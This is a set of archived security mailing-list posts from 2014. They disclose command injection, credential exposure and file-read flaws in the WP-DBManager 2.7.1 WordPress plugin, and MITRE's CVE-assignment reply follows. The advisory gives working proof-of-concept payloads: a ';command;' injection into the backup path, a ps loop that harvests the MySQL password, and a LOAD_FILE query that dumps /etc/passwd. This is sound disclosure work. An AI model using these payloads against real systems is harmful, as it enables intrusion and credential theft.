=== Content from seclists.org_ffa16e77_20250125_113903.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![oss-sec logo](/images/oss-sec-logo.png)](/oss-sec/)
## [oss-sec](/oss-sec/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](409)
[By Date](date.html#410)
[![Next](/images/right-icon-16x16.png)](411)

[![Previous](/images/left-icon-16x16.png)](365)
[By Thread](index.html#410)
[![Next](/images/right-icon-16x16.png)](411)

![](/shared/images/nst-icons.svg#search)

# Re: Vulnerabilities in WordPress Database Manager v2.7.1

---

*From*: cve-assign () mitre org

*Date*: Mon, 20 Oct 2014 13:48:47 -0400 (EDT)

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

```
> ```
> Download: <https://wordpress.org/plugins/wp-dbmanager/>
> Contacted: 10/13/2014, Vulnerabilities addressed in v2.7.2.
> Full Advisory: <http://www.vapid.dhs.org/advisories/wordpress/plugins/wp-dbmanager-2.7.1/index.html>
>
> ```

```

```
> ```
> In the following lines commands can be injected into the variables
> being used to build the command by using ;command;
>
> $backup['filepath']
> $backup['mysqldumppath']
>
> ```

```

Use CVE-2014-8334 for this issue involving shell metacharacters.

```
> ```
> --password="passwordhere"
>
> while (true); do  echo -n `ps ax | grep m[y]sqldump`; done
>
> ```

```

Use CVE-2014-8335 for this issue in which local users can see a
password by listing process arguments.

```
> ```
> only a few queries are allowed (Use Only INSERT, UPDATE, REPLACE,
> DELETE, CREATE and ALTER statements.) but these are sufficient to
> download sensitive system files:
>
> ```

```

```
> ```
> INSERT into password (passwords) VALUES(LOAD_FILE("/etc/passwd"));
>
> ```

```

This report seems related to:

  if ( preg_match( "/LOAD_FILE/i", $sql_query ) ) {

in the

  <https://github.com/lesterchan/wp-dbmanager/commit/7037fa8f61644098044379190d1d4bf1883b8e4a>

commit. Our question here is whether this is best categorized as a
WP-DBManager vulnerability fix, or a workaround for a MySQL
misconfiguration. It seems that, ideally, if WP-DBManager is not
supposed to be able to use MySQL to read arbitrary files, then this
would have been addressed with the configuration of the FILE privilege
or the secure_file_priv variable.

Presumably there are other products in which users are intended to be
able to use INSERT, but are not intended to be able to use LOAD_FILE.
It's not clear that, for every such product, doing preg_match for
/LOAD_FILE/i is the recommended approach, and absence of this approach
means that a CVE ID is assigned.

Also, in the WP-DBManager case, CREATE is allowed, and this could
conceivably mean that CREATE FUNCTION is available (again, depending
on the MySQL privilege configuration), possibly resulting in the user
gaining unintended access to the server machine and its local
filesystem.

Should there be one CVE ID now for "attempts to offer a subset of
MySQL statements without considering the possible MySQL privilege
configurations" as applied to the LOAD_FILE attack, and then other
"incomplete fix" CVE IDs later if a new attack against 2.7.2/2.7.3 is
disclosed?

- --
CVE assignment team, MITRE CVE Numbering Authority
M/S M300
202 Burlington Road, Bedford, MA 01730 USA
[ PGP key available through <http://cve.mitre.org/cve/request_id.html> ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.14 (SunOS)

iQEcBAEBAgAGBQJURUpKAAoJEKllVAevmvmsxC8H/RbAUETRxb72HufQQIx3+7Qf
ksf3B8IRz+4mnd/b97Fa4kFw+B04eOhXwUtp1Dl/BoGXGWn3kqcDvaqVxDRzLTL7
zNDt4b1riq4YFxWLStFv0gh8rIRcyMLMqP6iwY0WHT0ycliO4CaoAj240UF32OBo
e4PSqFZSm4o7915cg0nBhGYhI41TUBfETqruZnZ7oum/8SMvCjNJAqgn1xR+XDIE
mZggSYW2gvdFGxrjXcxyGhDDwAMBRArZhIZwczDzVIQJpx427GYFNKYrApB2mlze
4+R7Rq36RIylrqXvkvdGYSD4TvbcEhritEnV1qgc2PJ3pxI8XKpJr9oxSf065ZI=
=jsGy
-----END PGP SIGNATURE-----

```

---

[![Previous](/images/left-icon-16x16.png)](409)
[By Date](date.html#410)
[![Next](/images/right-icon-16x16.png)](411)

[![Previous](/images/left-icon-16x16.png)](365)
[By Thread](index.html#410)
[![Next](/images/right-icon-16x16.png)](411)

### Current thread:

* [Vulnerabilities in WordPress Database Manager v2.7.1](365) *Larry W. Cashdollar (Oct 16)*
  + **Re: Vulnerabilities in WordPress Database Manager v2.7.1** *cve-assign (Oct 20)*
    - [Re: Re: Vulnerabilities in WordPress Database Manager v2.7.1](411) *Larry W. Cashdollar (Oct 20)*
      * [Re: Vulnerabilities in WordPress Database Manager v2.7.1](415) *cve-assign (Oct 21)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from seclists.org_889194a2_20250125_113902.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![oss-sec logo](/images/oss-sec-logo.png)](/oss-sec/)
## [oss-sec](/oss-sec/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](364)
[By Date](date.html#365)
[![Next](/images/right-icon-16x16.png)](366)

[![Previous](/images/left-icon-16x16.png)](394)
[By Thread](index.html#365)
[![Next](/images/right-icon-16x16.png)](410)

![](/shared/images/nst-icons.svg#search)

# Vulnerabilities in WordPress Database Manager v2.7.1

---

*From*: "Larry W. Cashdollar" <larry0 () me com>

*Date*: Thu, 16 Oct 2014 15:50:51 -0400

---

```
Hello All,

May I have a CVE Assigned?

Title: Vulnerabilities in WordPress Database Manager v2.7.1
Author: Larry W. Cashdollar, @_larry0
Date: 10/13/2014
Download: <https://wordpress.org/plugins/wp-dbmanager/>
Downloads: 1,171,358
Vendor: Lester Chan, <https://profiles.wordpress.org/gamerz/>
Contacted: 10/13/2014, Vulnerabilities addressed in v2.7.2.
Full Advisory: <http://www.vapid.dhs.org/advisories/wordpress/plugins/wp-dbmanager-2.7.1/index.html>
CVE: N/A
OSVDBID: N/A

Description: "Allows you to optimize database, repair database, backup database, restore database, delete backup
database , drop/empty tables and run selected queries. Supports automatic scheduling of backing up, optimizing and
repairing of database."

Vulnerability: Plugin suffers from command injection, exposes MySQL database credentials to the process table and
allows the user to download system files via the ‘Run SQL Query’ feature. User authentication with
current_user_can('manage_database')) privileges are required.  The full advisory has screen shots for illustration.

PoC

Command Injection

The command that is sent through passthru() is the following:

/usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere"
--default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress >
/usr/share/wordpress/wp-content/backup-db\';rce;\'/1413225588_-_wordpress.sql

rce is just a homebrew .c binary I wrote for testing command injections it creates a file
in /tmp with some stats on who executed it.

# cat /tmp/RCE_JChl9c
ARGGHHH I've been executed! my pid is :16169 Parent id 16168
Name:        sh
State:        S (sleeping)
Tgid:        16168
Pid:        16168
PPid:        15925
TracerPid:        0
Uid:        33        33        33        33
Gid:        33        33        33        33
FDSize:        32
Groups:        33

In the following lines commands can be injected into the variables being used to build
the command by using ;command;

$backup['filepath']
$backup['mysqldumppath']

I use $backup[‘filepath’] or “Path To Backup:”  for my PoC.

/usr/share/wordpress/wp-content/backup-db;rce;

Saving and then Running a backup executes /usr/bin/rce, the command that is sent through passthru() is the following:

/usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere"
--default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress >
/usr/share/wordpress/wp-content/backup-db;rce;/1413225588_-_wordpress.sql

rce is just a homebrew .c binary I wrote for testing command injections, it creates a file
in /tmp with some stats on who executed it.

# cat /tmp/RCE_JChl9c
ARGGHHH I've been executed! my pid is :16169 Parent id 16168
Name:        sh
State:        S (sleeping)
Tgid:        16168
Pid:        16168
PPid:        15925
TracerPid:        0
Uid:        33        33        33        33
Gid:        33        33        33        33
FDSize:        32
Groups:        33

Mysql Credentials Leaked to Process Table

Also by running a simple script:
PoC:
 $ while (true); do  echo -n `ps ax | grep m[y]sqldump`; done

6324 ? S 0:00 sh -c /usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere"
--default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress >
/usr/share/wordpress/wp-content/backup-db/1413224776_-_wordpress.sql 6328 ? R 0:00 sh -c /usr/bin/mysqldump --force
--host="localhost" --user="root" --password="passwordhere" --default-character-set="utf8" --add-drop-table
--skip-lock-tables wordpress > /usr/share/wordpress/wp-content/backup-db/1413224776_-_wordpress.sql6324 ? S 0:00 sh -c
/usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere" --default-character-set="utf8"
--add-drop-table --skip-lock-tables wordpress > /usr/share/wordpress/wp-content/backup-db/1413224776_-_wordpress.sql
6328 ? S 0:00 /usr/bin/mysqldump --force --host=localhost --user=root --password=x xxxxxx --default-character-set=utf8
--add-drop-table --skip-lock-tables wordpress6324 ? S 0:00 sh -c /usr/bin/mysqldump --force --host="localhost"
--user="root" --password="passwordhere" --default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress >
/usr/share/wordpress/wp-content/backup-db/1413224776_-_wordpress.sql 6328 ? S 0:00 /usr/bin/mysqldump --force
--host=localhost --user=root --password=x xxxxxx --default-character-set=utf8 --add-drop-table --skip-lock-tables
wordpress

A malicious local user can harvest credentials for the mysql database off the process table.

The trouble is the code doesn’t properly sanitize user input and is being passed directly to passthru or system
depending on which OS you’re using.

     In wp-dbmanager.php:
        86                 $backup['command'] = '';
     87                 $brace = (substr(PHP_OS, 0, 3) == 'WIN') ? '"' : '';
     88                 if(intval($backup_options['backup_gzip']) == 1) {
     89                         $backup['filename'] = $backup['date'].'_-_'.DB_NAME.'.sql.gz';
     90                         $backup['filepath'] = $backup['path'].'/'.$backup['filename'];
     91                         $backup['command'] = $brace.$backup['mysqldumppath'].$brace.' --force
--host="'.$backup['host'].'" --user="'.DB_USER.'"
--password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].' --add-drop-table --skip-lock-tables '.DB_NAME.'
| gzip > '.$brace.$backup['filepath'].$brace;
     92                 } else {
     93                         $backup['filename'] = $backup['date'].'_-_'.DB_NAME.'.sql';
     94                         $backup['filepath'] = $backup['path'].'/'.$backup['filename'];
     95                         $backup['command'] = $brace.$backup['mysqldumppath'].$brace.' --force
--host="'.$backup['host'].'" --user="'.DB_USER.'"
--password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].' --add-drop-table --skip-lock-tables '.DB_NAME.'

```
> ```
> '.$brace.$backup['filepath'].$brace;
>
> ```

```
     96                 }
     97                 execute_backup($backup['command']);

    211 ### Executes OS-Dependent mysqldump Command (By: Vlad Sharanhovich)
    212 function execute_backup($command) {
    213         $backup_options = get_option('dbmanager_options');
    214         check_backup_files();
    215         if(substr(PHP_OS, 0, 3) == 'WIN') {
    216                 $writable_dir = $backup_options['path'];
    217                 $tmpnam = $writable_dir.'/wp-dbmanager.bat';
    218                 $fp = fopen($tmpnam, 'w');
    219                 fwrite($fp, $command);
    220                 fclose($fp);
    221                 system($tmpnam.' > NUL', $error);
    222                 unlink($tmpnam);
    223         } else {
    224                 passthru($command, $error);
    225         }
    226         return $error;
    227 }

In database-manage.php:
        46                                 if(stristr($database_file, '.gz')) {
     47                                         $backup['command'] = 'gunzip <
'.$brace.$backup['path'].'/'.$database_file.$brace.' | '.$brace.$backup['mysqlpath'].$brace.'
--host="'.$backup['host'].'" --user="'.DB_USER.'"
--password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].$backup['charset'].' '.DB_NAME;
     48                                 } else {
     49                                         $backup['command'] = $brace.$backup['mysqlpath'].$brace.'
--host="'.$backup['host'].'" --user="'.DB_USER.'"
--password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].$backup['charset'].' '.DB_NAME.' <
'.$brace.$backup['path'].'/'.$database_file.$brace;
     50                                 }
     51                                 passthru($backup['command'], $error);

File Downloads
In the ‘Sql Run Query’ Panel only a few queries are allowed (Use Only INSERT, UPDATE, REPLACE, DELETE, CREATE and ALTER
statements.) but these are suffiecient to download sensitive system files:
CREATE TABLE password (passwords varchar(8096));

INSERT into password (passwords) VALUES(LOAD_FILE(‘/etc/passwd’));

Then run a database backup, and download the backup file or send via email.

From 1413409573_-_wordpress.sql:

INSERT INTO `password` VALUES
('root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing
 List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System
(admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nlibuuid:x:100:101::/var/lib/libuuid:/bin/sh\nDebian-exim:x:101:104::/var/spool/exim4:/bin/false\nstatd:x:102:65534::/var/lib/nfs:/bin/false\nsshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin\npostgres:x:104:108:PostgreSQL

administrator,,,:/var/lib/postgresql:/bin/bash\nlarry:x:1000:1000:larry,,,:/home/larry:/bin/bash\nmysql:x:105:109:MySQL
Server,,,:/nonexistent:/bin/false\nmessagebus:x:106:110::/var/run/dbus:/bin/false\n');
/*!40000 ALTER TABLE `password` ENABLE KEYS */;

```

---

[![Previous](/images/left-icon-16x16.png)](364)
[By Date](date.html#365)
[![Next](/images/right-icon-16x16.png)](366)

[![Previous](/images/left-icon-16x16.png)](394)
[By Thread](index.html#365)
[![Next](/images/right-icon-16x16.png)](410)

### Current thread:

* **Vulnerabilities in WordPress Database Manager v2.7.1** *Larry W. Cashdollar (Oct 16)*
  + [Re: Vulnerabilities in WordPress Database Manager v2.7.1](410) *cve-assign (Oct 20)*
    - [Re: Re: Vulnerabilities in WordPress Database Manager v2.7.1](411) *Larry W. Cashdollar (Oct 20)*
      * [Re: Vulnerabilities in WordPress Database Manager v2.7.1](415) *cve-assign (Oct 21)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from seclists.org_5b21fb1e_20250125_113901.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](98)
[By Date](date.html#99)
[![Next](/images/right-icon-16x16.png)](100)

[![Previous](/images/left-icon-16x16.png)](107)
[By Thread](index.html#99)
[![Next](/images/right-icon-16x16.png)](101)

![](/shared/images/nst-icons.svg#search)

# Vulnerabilities in WordPress Database Manager v2.7.1

---

*From*: "Larry W. Cashdollar" <larry0 () me com>

*Date*: Tue, 21 Oct 2014 08:37:59 -0400

---

```
Title: Vulnerabilities in WordPress Database Manager v2.7.1
Author: Larry W. Cashdollar, @_larry0
Date: 10/13/2014
Download: <https://wordpress.org/plugins/wp-dbmanager/>
Downloads: 1,171,358
Vendor: Lester Chan, <https://profiles.wordpress.org/gamerz/>
Contacted: 10/13/2014, Vulnerabilities addressed in v2.7.2.
Full Advisory: <http://www.vapid.dhs.org/advisories/wordpress/plugins/wp-dbmanager-2.7.1/index.html>
CVE: 2014-8334,2014-8335
OSVDBID: 113508,113507,113509

Description: "Allows you to optimize database, repair database, backup database, restore database, delete backup
database , drop/empty tables and run selected queries. Supports automatic scheduling of backing up, optimizing and
repairing of database."

Vulnerability: Plugin suffers from command injection, exposes MySQL database credentials to the process table and
allows the user to download system files via the ‘Run SQL Query’ feature. User authentication with
current_user_can('manage_database')) privileges are required.  The full advisory has screen shots for illustration.

PoC

Command Injection

The command that is sent through passthru() is the following:

/usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere"
--default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress >
/usr/share/wordpress/wp-content/backup-db\';rce;\'/1413225588_-_wordpress.sql

rce is just a homebrew .c binary I wrote for testing command injections it creates a file
in /tmp with some stats on who executed it.

# cat /tmp/RCE_JChl9c
ARGGHHH I've been executed! my pid is :16169 Parent id 16168
Name:        sh
State:        S (sleeping)
Tgid:        16168
Pid:        16168
PPid:        15925
TracerPid:        0
Uid:        33        33        33        33
Gid:        33        33        33        33
FDSize:        32
Groups:        33

In the following lines commands can be injected into the variables being used to build
the command by using ;command;

$backup['filepath']
$backup['mysqldumppath']

I use $backup[‘filepath’] or “Path To Backup:”  for my PoC.

/usr/share/wordpress/wp-content/backup-db;rce;

Saving and then Running a backup executes /usr/bin/rce, the command that is sent through passthru() is the following:

/usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere"
--default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress >
/usr/share/wordpress/wp-content/backup-db;rce;/1413225588_-_wordpress.sql

rce is just a homebrew .c binary I wrote for testing command injections, it creates a file
in /tmp with some stats on who executed it.

# cat /tmp/RCE_JChl9c
ARGGHHH I've been executed! my pid is :16169 Parent id 16168
Name:        sh
State:        S (sleeping)
Tgid:        16168
Pid:        16168
PPid:        15925
TracerPid:        0
Uid:        33        33        33        33
Gid:        33        33        33        33
FDSize:        32
Groups:        33

Mysql Credentials Leaked to Process Table

Also by running a simple script:
PoC:
$ while (true); do  echo -n `ps ax | grep m[y]sqldump`; done

6324 ? S 0:00 sh -c /usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere"
--default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress >
/usr/share/wordpress/wp-content/backup-db/1413224776_-_wordpress.sql 6328 ? R 0:00 sh -c /usr/bin/mysqldump --force
--host="localhost" --user="root" --password="passwordhere" --default-character-set="utf8" --add-drop-table
--skip-lock-tables wordpress > /usr/share/wordpress/wp-content/backup-db/1413224776_-_wordpress.sql6324 ? S 0:00 sh -c
/usr/bin/mysqldump --force --host="localhost" --user="root" --password="passwordhere" --default-character-set="utf8"
--add-drop-table --skip-lock-tables wordpress > /usr/share/wordpress/wp-content/backup-db/1413224776_-_wordpress.sql
6328 ? S 0:00 /usr/bin/mysqldump --force --host=localhost --user=root --password=x xxxxxx --default-character-set=utf8
--add-drop-table --skip-lock-tables wordpress6324 ? S 0:00 sh -c /usr/bin/mysqldump --force --host="localhost"
--user="root" --password="passwordhere" --default-character-set="utf8" --add-drop-table --skip-lock-tables wordpress >
/usr/share/wordpress/wp-content/backup-db/1413224776_-_wordpress.sql 6328 ? S 0:00 /usr/bin/mysqldump --force
--host=localhost --user=root --password=x xxxxxx --default-character-set=utf8 --add-drop-table --skip-lock-tables
wordpress

A malicious local user can harvest credentials for the mysql database off the process table.

The trouble is the code doesn’t properly sanitize user input and is being passed directly to passthru or system
depending on which OS you’re using.

    In wp-dbmanager.php:
       86                 $backup['command'] = '';
    87                 $brace = (substr(PHP_OS, 0, 3) == 'WIN') ? '"' : '';
    88                 if(intval($backup_options['backup_gzip']) == 1) {
    89                         $backup['filename'] = $backup['date'].'_-_'.DB_NAME.'.sql.gz';
    90                         $backup['filepath'] = $backup['path'].'/'.$backup['filename'];
    91                         $backup['command'] = $brace.$backup['mysqldumppath'].$brace.' --force
--host="'.$backup['host'].'" --user="'.DB_USER.'"
--password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].' --add-drop-table --skip-lock-tables '.DB_NAME.'
| gzip > '.$brace.$backup['filepath'].$brace;
    92                 } else {
    93                         $backup['filename'] = $backup['date'].'_-_'.DB_NAME.'.sql';
    94                         $backup['filepath'] = $backup['path'].'/'.$backup['filename'];
    95                         $backup['command'] = $brace.$backup['mysqldumppath'].$brace.' --force
--host="'.$backup['host'].'" --user="'.DB_USER.'"
--password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].' --add-drop-table --skip-lock-tables '.DB_NAME.'

```
> ```
> '.$brace.$backup['filepath'].$brace;
>
> ```

```
    96                 }
    97                 execute_backup($backup['command']);

   211 ### Executes OS-Dependent mysqldump Command (By: Vlad Sharanhovich)
   212 function execute_backup($command) {
   213         $backup_options = get_option('dbmanager_options');
   214         check_backup_files();
   215         if(substr(PHP_OS, 0, 3) == 'WIN') {
   216                 $writable_dir = $backup_options['path'];
   217                 $tmpnam = $writable_dir.'/wp-dbmanager.bat';
   218                 $fp = fopen($tmpnam, 'w');
   219                 fwrite($fp, $command);
   220                 fclose($fp);
   221                 system($tmpnam.' > NUL', $error);
   222                 unlink($tmpnam);
   223         } else {
   224                 passthru($command, $error);
   225         }
   226         return $error;
   227 }

In database-manage.php:
       46                                 if(stristr($database_file, '.gz')) {
    47                                         $backup['command'] = 'gunzip <
'.$brace.$backup['path'].'/'.$database_file.$brace.' | '.$brace.$backup['mysqlpath'].$brace.'
--host="'.$backup['host'].'" --user="'.DB_USER.'"
--password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].$backup['charset'].' '.DB_NAME;
    48                                 } else {
    49                                         $backup['command'] = $brace.$backup['mysqlpath'].$brace.'
--host="'.$backup['host'].'" --user="'.DB_USER.'"
--password="'.$backup['password'].'"'.$backup['port'].$backup['sock'].$backup['charset'].' '.DB_NAME.' <
'.$brace.$backup['path'].'/'.$database_file.$brace;
    50                                 }
    51                                 passthru($backup['command'], $error);

File Downloads
In the ‘Sql Run Query’ Panel only a few queries are allowed (Use Only INSERT, UPDATE, REPLACE, DELETE, CREATE and ALTER
statements.) but these are suffiecient to download sensitive system files:
CREATE TABLE password (passwords varchar(8096));

INSERT into password (passwords) VALUES(LOAD_FILE(‘/etc/passwd’));

Then run a database backup, and download the backup file or send via email.

```
> ```
> From 1413409573_-_wordpress.sql:
>
> ```

```

INSERT INTO `password` VALUES
('root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing
 List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System
(admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nlibuuid:x:100:101::/var/lib/libuuid:/bin/sh\nDebian-exim:x:101:104::/var/spool/exim4:/bin/false\nstatd:x:102:65534::/var/lib/nfs:/bin/false\nsshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin\npostgres:x:104:108:PostgreSQL

administrator,,,:/var/lib/postgresql:/bin/bash\nlarry:x:1000:1000:larry,,,:/home/larry:/bin/bash\nmysql:x:105:109:MySQL
Server,,,:/nonexistent:/bin/false\nmessagebus:x:106:110::/var/run/dbus:/bin/false\n');
/*!40000 ALTER TABLE `password` ENABLE KEYS */;

_______________________________________________
Sent through the Full Disclosure mailing list
<http://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](98)
[By Date](date.html#99)
[![Next](/images/right-icon-16x16.png)](100)

[![Previous](/images/left-icon-16x16.png)](107)
[By Thread](index.html#99)
[![Next](/images/right-icon-16x16.png)](101)

### Current thread:

* **Vulnerabilities in WordPress Database Manager v2.7.1** *Larry W. Cashdollar (Oct 22)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from wordpress.org_864837d5_20250125_113904.html ===


[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
